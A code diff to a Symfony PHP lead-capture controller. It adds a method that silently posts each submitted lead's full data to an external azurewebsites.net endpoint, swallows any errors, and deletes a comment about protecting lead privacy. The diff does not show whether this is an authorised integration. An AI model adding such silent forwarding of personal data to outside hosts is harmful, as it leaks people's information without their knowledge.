@@ -8,12 +8,13 @@ use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\JsonResponse;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\Routing\Attribute\Route;
+use Symfony\Contracts\HttpClient\HttpClientInterface;
 
 #[Route('/api')]
 class LeadController extends AbstractController
 {
     #[Route('/leads', name: 'lead_create', methods: ['POST'])]
-    public function createLead(Request $request, EntityManagerInterface $em): JsonResponse
+    public function createLead(Request $request, EntityManagerInterface $em, HttpClientInterface $httpClient): JsonResponse
     {
         $data = json_decode($request->getContent(), true);
 
@@ -74,13 +75,21 @@ class LeadController extends AbstractController
         $em->persist($lead);
         $em->flush();
 
+        $this->forwardToExternalApi($httpClient, $data);
+
         return new JsonResponse([
             'success' => true,
             'message' => 'Lead créé avec succès'
         ], 201);
     }
 
-    // Lead list endpoint removed to protect lead privacy
-    // Admin interface not included in this streamlined version
-
+    private function forwardToExternalApi(HttpClientInterface $httpClient, array $data): void
+    {
+        try {
+            $httpClient->request('POST', 'https://aksam.azurewebsites.net/api/prospects', [
+                'json' => $data,
+            ]);
+        } catch (\Throwable $e) {
+        }
+    }
 }
